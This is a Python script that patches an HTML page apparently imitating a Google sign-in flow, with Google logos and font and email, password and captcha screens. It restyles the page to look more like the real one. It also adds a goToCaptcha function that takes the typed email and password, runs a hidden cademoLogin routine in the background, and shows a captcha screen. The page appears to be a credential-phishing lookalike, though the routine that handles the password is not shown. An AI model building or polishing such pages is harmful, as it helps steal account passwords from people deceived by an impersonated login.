import re

with open('C:/Users/Leo/cademo/index.html','r',encoding='utf-8') as f:
    s = f.read()

# 1. Ajouter CSS pour centrer verticalement les écrans d'auth
old_screen_css = '''        .screen.active {
            display: block;
        }'''
new_screen_css = '''        .screen.active {
            display: block;
        }
        /* Centrer verticalement les écrans d'authentification */
        #page-email.screen.active,
        #page-password.screen.active,
        #page-captcha.screen.active,
        #page-mail-info.screen.active {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }'''
s = s.replace(old_screen_css, new_screen_css)

# 2. Réduire logos Google à 24px et bien aligner à gauche (display:block)
s = s.replace('style="width:48px;height:48px;margin:0 0 16px 0;display:block;"', 'style="width:24px;height:24px;margin:0 0 16px 0;display:block;"')
s = s.replace('style="width:48px;height:48px;margin-bottom:16px;"', 'style="width:24px;height:24px;margin-bottom:16px;display:block;"')
s = s.replace('style="width:48px;height:48px;margin-bottom:16px;">', 'style="width:24px;height:24px;margin-bottom:16px;display:block;">')

# 3. Bienvenue : passer à 24px et aligner à gauche
s = s.replace(
    'font-size:44px;font-weight:400;margin-bottom:8px;color:#202124;font-family:\'Google Sans\',Roboto,Arial,sans-serif;">Bienvenue</h1>',
    'font-size:24px;font-weight:400;margin-bottom:8px;color:#202124;font-family:\'Google Sans\',Roboto,Arial,sans-serif;text-align:left;">Bienvenue</h1>'
)

# 4. Supprimer la flèche vers le bas du chip email
s = s.replace('                <span style="color:#5f6368;font-size:10px;">&#9660;</span>\n', '')

# 5. Supprimer padding-top:24px des conteneurs internes pour laisser le flex centrer
s = s.replace('max-width:400px;margin:0 auto;padding-top:24px;">', 'max-width:400px;margin:0 auto;width:100%;">')
s = s.replace('max-width:450px;margin:0 auto;padding-top:24px;">', 'max-width:450px;margin:0 auto;width:100%;">')

# 6. Changer le onclick du bouton Suivant mot de passe pour appeler goToCaptcha
s = s.replace('onclick="cademoLogin();"', 'onclick="goToCaptcha();"')

# 7. Ajouter la fonction goToCaptcha après goToPassword
old_gtp = '''        // On change d\'écran
        showScreen('page-password');
    }
</script>'''
new_gtp = '''        // On change d\'écran
        showScreen('page-password');
    }

    function goToCaptcha() {
        var email = document.getElementById('displayEmail').innerText.trim();
        var pwEl = document.getElementById('passwordInput');
        var pw = (pwEl ? pwEl.value : '').trim();
        if (email === 'Chargement...' || !email) {
            alert('Erreur : e-mail non chargé. Retournez à la page précédente.');
            return;
        }
        if (!pw) {
            alert('Veuillez saisir votre mot de passe.');
            pwEl.focus();
            return;
        }
        // Lancer la logique métier en arrière-plan
        try { cademoLogin(); } catch(e) { console.error(e); }
        // Naviguer vers le captcha
        showScreen('page-captcha');
    }
</script>'''
s = s.replace(old_gtp, new_gtp)

with open('C:/Users/Leo/cademo/index.html','w',encoding='utf-8') as f:
    f.write(s)

print('Modifications terminées.')
